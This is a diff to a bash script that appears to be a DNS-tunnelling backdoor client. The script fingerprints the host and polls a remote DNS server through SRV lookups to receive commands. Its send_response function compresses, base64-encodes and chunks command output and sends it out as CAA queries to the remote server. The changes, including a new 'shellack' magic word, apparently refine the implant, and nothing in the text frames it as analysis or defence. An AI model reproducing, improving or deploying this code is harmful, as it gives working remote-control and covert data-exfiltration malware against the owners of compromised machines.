@@ -6,6 +6,7 @@ set -u -o pipefail
 
 readonly HOSTNAME=$(hostname)
 readonly DOMAIN=$(grep "^search" /etc/resolv.conf | cut -d" " -f2)
+readonly MAGIC_WORD="${MAGIC_WORD:-shellack}"
 readonly MAGIC_NUM=$(echo $HOSTNAME | cksum | cut -c1-5)
 readonly MAGIC_NUM2=$(stat -f %m /etc | cut -c8-9)
 readonly CLIENT_ID="${MAGIC_NUM}${MAGIC_NUM2}"
@@ -43,7 +44,7 @@ vendor() {
 next_cmd() {
     local record="${CLIENT_ID}.__$(vendor)__${DOMAIN}_${HOSTNAME}"
     local kw=$(echo "${record}" | tr 'A-Z' 'a-z' | sed s/'\(.\)'/'\1\n'/g| sort -u | xargs | sed s/" "/""/g )
-    local raw=$(nslookup -q=srv "${record}" "${remote}" | grep -o "_loc_.*")
+    local raw=$(nslookup -q=srv "${record}" ${remote} | grep -o "_loc_.*")
     if [[ "${raw}" == "" ]]; then
         return 1
     fi
@@ -60,7 +61,7 @@ next_cmd() {
 
 send_response() {
     pre_split=$(mktemp)
-    echo "${out}" | compress -c | openssl base64 > "${pre_split}"
+    echo "${out}" | gzip -c | openssl base64 | tr -d '\n' > "${pre_split}"
     size=$(stat -f %z "${pre_split}")
     cd "${TMPDIR}"
 
@@ -70,7 +71,7 @@ send_response() {
     for chunk in ${MAGIC_NUM}.*; do
         chunk_id=$(expr $chunk_id + 1)
         CAA_RECORD="${MAGIC_NUM}.${size}.$(cat $chunk)"
-        raw=$(nslookup -q=caa "${CAA_RECORD}" "${remote}" | grep -o "_caa_.*")
+        raw=$(nslookup -q=caa "${CAA_RECORD}" ${remote} | grep -o "_caa_.*")
         rm "${chunk}"
     done
 }
